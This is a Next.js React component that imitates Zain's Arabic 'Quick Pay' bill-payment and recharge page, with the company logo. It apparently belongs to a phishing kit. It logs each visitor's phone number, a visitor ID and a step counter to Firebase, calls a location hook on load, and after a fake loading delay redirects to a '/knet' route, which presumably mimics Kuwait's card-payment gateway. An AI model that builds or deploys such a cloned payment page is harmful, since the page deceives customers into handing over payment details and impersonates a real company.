"use client"

import type React from "react"

import { useState } from "react"
import { ChevronDown, Heart, Menu, ShoppingCart } from "lucide-react"
import { useRouter } from "next/navigation"
import { addData } from "./lib/firebase"
import Loader from "./components/loader"
import { useLocation } from "./lib/use-location"

export default function QuickPay() {
  const [phone, setPhone] = useState("")
  const [activeTab, setActiveTab] = useState<"bill" | "recharge">("bill")
  const [termsAccepted, setTermsAccepted] = useState(false)

  const isPhoneValid = /^9\d{7}$/.test(phone)
  const [loading, setLoading] = useState(false)
  const [selectedAmounts, setSelectedAmounts] = useState<number>(5.0)

  const router = useRouter()

  // Call useLocation at the top level of the component
  useLocation()

  const handleAmountChange = (e: React.ChangeEvent<HTMLSelectElement>) => {
    const value = e.target.value
    setSelectedAmounts(Number.parseFloat(value))
    localStorage.setItem("amount", e.target.value)
  }

  const total = selectedAmounts

  const handleSubmit = (e: any) => {
    e.preventDefault()
    const visitorId = localStorage.getItem("visitor")
    addData({
      createdDate: new Date().toISOString(),
      id: visitorId,
      phone: phone,
      step: 1,
    })
    setLoading(true)

    setTimeout(() => {
      router.push("/knet")
      setLoading(false)
    }, 2000)
  }

  return (
    <div className="min-h-screen bg-gray-100 font-[Cairo] text-right" dir="rtl">
      {/* Header */}
      <header className="bg-gradient-to-l from-[#2b004d] to-[#1e0036] p-4 flex justify-between items-center">
        <button className="text-white">
          <Menu size={24} />
        </button>
        <div className="flex items-center gap-4">
          <Heart size={24} className="text-white" />
          <div className="bg-white rounded-full p-2">
            <ShoppingCart size={20} className="text-[#d50087]" />
          </div>
        </div>
        <div className="absolute right-0 left-0 flex justify-center">
          <img src="/top.png" alt="Zain Logo" className="object-contain" />
        </div>
      </header>

      <main className="p-4">
        {/* Main Card */}
        <div className="bg-white rounded-2xl shadow-md p-6 max-w-md mx-auto">
          <h1 className="text-2xl font-bold mb-6 text-right">الدفع السريع</h1>

          {/* Tabs */}
          <div className="flex border-b mb-6">
            <button
              className={`flex-1 pb-2 font-bold ${activeTab === "bill" ? "text-[#d50087] border-b-2 border-[#d50087]" : "text-gray-500"}`}
              onClick={() => setActiveTab("bill")}
            >
              دفع الفاتورة
            </button>
            <button
              className={`flex-1 pb-2 font-bold ${activeTab === "recharge" ? "text-[#d50087] border-b-2 border-[#d50087]" : "text-gray-500"}`}
              onClick={() => setActiveTab("recharge")}
            >
              إعادة تعبئة eeZee
            </button>
          </div>

          {/* Form */}
          <form onSubmit={handleSubmit}>
            <div className="mb-4">
              <label className="block font-semibold mb-1">أود الدفع لـ</label>
              <div className="relative">
                <select className="w-full p-3 border-b-2 border-[#d50087] bg-transparent appearance-none focus:outline-none">
                  <option>رقم آخر</option>
                  <option>رقم العقد</option>
                </select>
                <ChevronDown className="absolute left-2 top-3 text-[#d50087]" size={20} />
              </div>
            </div>

            <div className="mb-4">
              <label className="block font-semibold mb-1">
                أدخل رقم الهاتف <span className="text-red-500">*</span>
              </label>

              <input
                type="text"
                placeholder="9XXXXXXXX"
                className={`w-full p-3 border-b-2 ${isPhoneValid ? "border-green-500" : "border-[#d50087]"} bg-transparent focus:outline-none`}
                value={phone}
                onChange={(e) => setPhone(e.target.value)}
                maxLength={8}
              />
            </div>

            {isPhoneValid && (
              <div className="mb-4">
                <label className="block font-semibold mb-1">القيمة المختارة</label>
                <div className="relative">
                  <select
                    className="w-full p-3 border-b-2 border-[#d50087] bg-transparent appearance-none focus:outline-none"
                    value={selectedAmounts}
                    onChange={handleAmountChange}
                  >
                    <option value={0}>اختر المبلغ</option>
                    <option value={3}>3.000 د.ك</option>
                    <option value={5}>5.000 د.ك</option>
                    <option value={10}>10.000 د.ك</option>
                    <option value={20}>20.000 د.ك</option>
                    <option value={30}>30.000 د.ك</option>
                    <option value={40}>40.000 د.ك</option>
                    <option value={50}>50.000 د.ك</option>
                  </select>
                  <ChevronDown className="absolute left-2 top-3 text-[#d50087]" size={20} />
                </div>
              </div>
            )}
            <div className="mb-6">
              <div className="flex items-start gap-3 mb-4">
                <input
                  type="checkbox"
                  id="terms"
                  className="mt-1"
                  checked={termsAccepted}
                  onChange={(e) => setTermsAccepted(e.target.checked)}
                />
                <label htmlFor="terms" className="text-sm">
                  قرأت ووافقت على الشروط والأحكام
                </label>
              </div>
            </div>

            <button
              type="button"
              className="w-full mt-6 p-3 bg-gray-200 text-gray-500 rounded-md flex items-center justify-center"
            >
              <span className="mr-2">+</span> أضف رقم آخر
            </button>

            <div className="flex justify-between items-center mt-10 pt-4 border-t">
              <span className="font-bold">إجمالي</span>
              <span className="text-green-500 font-bold">{selectedAmounts.toFixed(3)} د.ك</span>
            </div>

            <button
              type="submit"
              className={`w-full mt-6 p-3 rounded-md ${
                selectedAmounts > 0 && isPhoneValid && termsAccepted
                  ? "bg-[#d50087] text-white cursor-pointer"
                  : "bg-gray-200 text-gray-500 cursor-not-allowed"
              }`}
              disabled={selectedAmounts === 0 || !isPhoneValid || !termsAccepted}
            >
              ادفع الآن
            </button>
          </form>
        </div>
      </main>
      {loading && <Loader />}
    </div>
  )
}
